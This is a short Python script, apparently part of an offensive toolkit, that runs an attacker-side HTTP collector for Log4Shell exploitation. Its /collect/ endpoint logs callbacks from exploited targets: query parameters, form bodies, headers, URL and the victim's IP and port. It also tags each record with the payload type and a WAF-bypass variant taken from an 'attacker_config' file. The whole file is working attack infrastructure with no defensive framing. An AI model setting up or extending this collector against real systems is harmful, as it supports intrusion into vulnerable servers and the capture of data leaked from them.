#!/usr/bin/env python3
from sanic import response

from horrors import (
    scenarios,
    services,
)

try:
    import attacker_config as config
except ImportError:
    exit('Configuration file `attacker_config.py` not found!')


class HTTPCollector(services.HTTPCollector):

    def collect(self, request):
        doc = dict()
        query = request.get_args()
        if query:
            doc['query'] = query
        body = dict(request.form)
        if body:
            doc['body'] = body
        doc['payload'] = {}
        doc['payload']['type'] = query.get('type')
        bypass_id = query.get('bypass_id')
        if bypass_id:
            doc['payload']['bypass'] = config.BYPASSES[int(bypass_id)]
        doc['payload']['header'] = query.get('header')
        doc['url'] = request.url
        doc['headers'] = dict(request.headers)
        doc['socket'] = {'ip': request.socket[0], 'port': request.socket[1]}
        self.db.insert(doc)
        return response.html(
            self.template_200.format(banner=self.banner, content=doc)
        )


if __name__ == '__main__':

    httpd = HTTPCollector()
    httpd.add_route('/', ['GET'], '<html><head><title>horrors-log4shell</title></head><body><h1>Welcome</h1><hr></body></html>')
    httpd.add_route('/collect/', ['GET', 'POST'], httpd.collect)

    story = scenarios.Scenario(debug=True)
    story.add_service(httpd)
    story.play()
